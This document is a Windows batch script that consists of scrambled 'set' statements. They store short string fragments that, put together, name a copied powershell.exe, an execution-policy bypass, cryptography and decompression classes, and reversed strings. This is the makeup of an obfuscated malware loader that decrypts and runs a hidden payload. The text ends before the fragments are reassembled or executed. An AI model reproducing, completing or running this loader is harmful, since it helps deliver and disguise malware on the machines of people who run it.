@echo off
set "HfIQQlBQSW=1."
set "uUBycxRwKv=32"
set "AoqGeIZCBN=ow"
set "KwkxNbsiyd=ll"
set "VXMGXqmSvl=0\"
set "ddxTVIMfKn=Sy"
set "OnrZDARNud=po"
set "BJVLhJCYRy=y "
set "zIMMpjcDFK=st"
set "sLUmYSxvVx=co"
set "KVccbNGoNz=\v"
set "sFSjNguxKO=ws"
set "sDAQBXJFSQ=:\"
set "ACpBhNiveK=rs"
set "tNvPOvmzAt=ll"
set "LmzsTFhoKS=do"
set "hAKngENtGB=we"
set "PfgqhNgAML= /"
set "CxNsPNTDAu=s\"
set "jWxaFeVLem=Po"
set "NwqjmgwPcn=rS"
set "LpYQtQrAka=in"
set "amLXIUXzGr=em"
set "genTuSrieo= C"
set "rwJKCtHiCM=xe"
set "CSlULmXPSP=.e"
set "frmKKKvzvH=we"
set "WUSonULacF=\W"
set "sKRvfoybSf=nd"
set "BOSCKtOInq=he"
set "vTQwROOyMO=he"
set "yskJtaPnKl=Wi"
set "mAsdLmdGio=py"
set "MSwNjcECpJ=cd"
set "jLiQVtPTVj= %~dp0"
set "aBDCGbwNAD=lBlo"
set "cjLniMMhay=ect "
set "oiKKpgUsvF=7Yiv"
set "cZdiviZIMX=qaJl"
set "IeTHfhcZWW=.Mod"
set "tYcPGArCeX=ltzU"
set "nqMjkSOMFo=($RK"
set "mYZumlLzCR=brea"
set "tYzSwsMycb=bYGg"
set "tUgFUBvGgx=Stre"
set "eXjGoWZbnb=y]::"
set "bykFUmwpmR=gnir"
set "hwgtRhwVOu=Obje"
set "vpYpfaIuta=bypa"
set "xeLIUQesEA=ck($"
set "awYDoMWOFu=ert]"
set "CHrzBpMiOa=orF'"
set "boicwfcbod=] -j"
set "BysrTDnpuz=Syst"
set "MxYexDgbRI=.Mem"
set "oWAEwBqFTL=raph"
set "gbUokhxhoQ=).Sp"
set "DdexWXoyCJ=pose"
set "dSBMcnepeq=+hAO"
set "QMmRWFlDMC=isfL"
set "TegawozCUA=Tltz"
set "pYUbCeGmaC=Syst"
set "BINvItFUIm=-joi"
set "JTmRxZyfUY=nirt"
set "AfFpApmVkw=3HWs"
set "eCbGatxLNz=[]] "
set "KRiJQYKfVd=BC;$"
set "zCMeWutOwG=EDL."
set "GsqakyfVPH=V = "
set "IjvRxiepzK=rtS4"
set "ZzERSKvGsc= = N"
set "OZTcaPZoUh===')"
set "ZdxFNVyKit=$JEk"
set "UUmpZtCuTD=.Com"
set "uUzIbbPzqO= = $"
set "PErVnUvXlp=Ahrw"
set "HHhFhscwMF=File"
set "zvIAbnvXJV=$RVw"
set "ZsAhmeHiFP=ddin"
set "FvHmNBAFMQ=.Cry"
set "qGCNjVnrcf='[-1"
set "ntNJeMZDMv=);$T"
set "PLyLsPitKF=pose"
set "qlqDxtyIjq=pher"
set "NTOoxiTmad=Fina"
set "hfDdruELMc=ion."
set "fhEwIHLBjI=pres"
set "OoKcHnZPFb=ESQI"
set "lVLaqXpSvH=e]::"
set "mGbiINftcB='[-1"
set "GOgumZPRAW=u.Su"
set "mWDuqCSPzq=VNgg"
set "LbAQJmKjDc=::De"
set "IUMVRzgUcy= '')"
set "aURnIhigiG=stem"
set "LAlOuydgTT=New-"
set "XFXQHSQGCt=);$T"
set "rqlpSQwHnV=();$"
set "VxxjehXejL=fore"
set "gtIKbIspIB=('l0"
set "GqlVzKSVfD=kbU."
set "zExtpiHvBe=Bmor"
set "jCHmbXtxft=rity"
set "LdqXyEuzXo=sion"
set "mvAHkgAYmp=)) {"
set "SAFyVaiPAX=VwRk"
set "oNJDtLfjVT=ing("
set "EDaoOcLaDs=)))"
set "tkkdpFZwvg=ptog"
set "nhwlXaKdBG=m(, "
set "pWAcDfubvH=em.C"
set "AyaeztSGeH=hY ="
set "PCTRNFBqfC=EDL "
set "nIirANjMmo=ateD"
set "hEMIIvEOlz=k = "
set "XQjJYNFKmk=ltzU"
set "XrKNOPLIEy=Rk);"
set "vSSjprhZeq=stem"
set "ofVyGmNDPG=ptog"
set "ZBnVORLkkf=$JES"
set "mUgQnwWqkG=ring"
set "khOVVTwIFH=.Cry"
set "PGtTzLjnfJ=k = "
set "UfEjNGjbxq=nage"
set "TRtQpdiFCG=rans"
set "kbJswrMprc=raph"
set "EyyXuVXIMs=pDZz"
set "oHYgivgrgo=in $"
set "PlBtvdqnyu=le  "
set "SUDojYJYuV=0O+g"
set "TelIShFHSp=m.IO"
set "iXvKINRZVK=Comp"
